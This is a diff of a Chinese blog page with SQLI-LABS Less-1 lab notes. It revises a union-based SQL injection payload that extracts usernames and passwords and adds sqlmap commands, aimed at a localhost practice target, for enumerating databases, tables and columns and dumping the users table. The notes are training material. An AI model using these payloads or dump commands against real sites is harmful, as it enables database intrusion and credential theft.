@@ -42,9 +42,16 @@
 <meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250206190354168.png">
 <meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250206190559094.png">
 <meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250206190634321.png">
-<meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250206192405004.png">
+<meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250207154616923.png">
+<meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250209162519449.png">
+<meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250209163333367.png">
+<meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250209163813847.png">
+<meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250209164121178.png">
+<meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250209164419679.png">
+<meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250209164949167.png">
+<meta property="og:image" content="https://kaopuye.github.io/2025/02/05/sqli-labs-notes/image-20250209164814955.png">
 <meta property="article:published_time" content="2025-02-04T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-02-06T11:28:44.346Z">
+<meta property="article:modified_time" content="2025-02-09T08:51:07.975Z">
 <meta property="article:author" content="椰子">
 <meta property="article:tag" content="SQL注入">
 <meta property="article:tag" content="SQLI-LABS">
@@ -242,7 +249,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          925 字
+          1.1k 字
         
       </span>
     
@@ -253,7 +260,7 @@
         
         
         
-          8 分钟
+          9 分钟
         
       </span>
     
@@ -367,9 +374,31 @@
 <p><img src="/2025/02/05/sqli-labs-notes/image-20250206190559094.png" srcset="/img/loading.gif" lazyload></p>
 <p><img src="/2025/02/05/sqli-labs-notes/image-20250206190634321.png" srcset="/img/loading.gif" lazyload></p>
 <p>看着乱的话可参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/xingke/article/details/102811555"> 进制对照表</a>，在查询账号和密码中间加上分隔符。(比如 0x2D 是减号[-]，0x3A 是冒号[:]，使用方式如：<code>group_concat(concat(username,0x3a,password))</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">?id=-1&#x27; union select 1,group_concat(username),group_concat(concat(username,0x3a,password)) from users --+<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">?id=-1&#x27; union select 1,2,group_concat(concat(username,0x3a,password)) from users --+<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2025/02/05/sqli-labs-notes/image-20250206192405004.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/02/05/sqli-labs-notes/image-20250207154616923.png" srcset="/img/loading.gif" lazyload alt="Less-1最终答案"></p>
+<h3 id="使用sqlmap"><a href="#使用sqlmap" class="headerlink" title="使用sqlmap"></a>使用sqlmap</h3><p><strong>判断注入点</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Python3 sqlmap.py -u &quot;http://localhost/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&quot;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/05/sqli-labs-notes/image-20250209162519449.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>爆库</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Python3 sqlmap.py -u &quot;http://localhost/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&quot; -dbs     // 爆出所有数据库<br>或<br>Python3 sqlmap.py -u &quot;http://localhost/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&quot; --current-db<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/05/sqli-labs-notes/image-20250209163333367.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/02/05/sqli-labs-notes/image-20250209163813847.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>爆表</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Python3 sqlmap.py -u &quot;http://localhost/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&quot; -D &quot;security&quot; --tables<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/05/sqli-labs-notes/image-20250209164121178.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>爆字段</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Python sqlmap.py -u &quot;http://localhost/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&quot; -D &quot;security&quot; -T &quot;users&quot; --columns<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/05/sqli-labs-notes/image-20250209164419679.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>爆数据</strong></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmd">Python3 sqlmap.py -u &quot;http://localhost/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&quot; -D &quot;security&quot; -T &quot;users&quot; --columns --dump<br>或<br>Python3 sqlmap.py -u &quot;http://localhost/Less-<span class="hljs-number">1</span>/?id=<span class="hljs-number">1</span>&quot; -D &quot;security&quot; -T &quot;users&quot; --columns -C &quot;password,username&quot; --dump<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/05/sqli-labs-notes/image-20250209164949167.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2025/02/05/sqli-labs-notes/image-20250209164814955.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
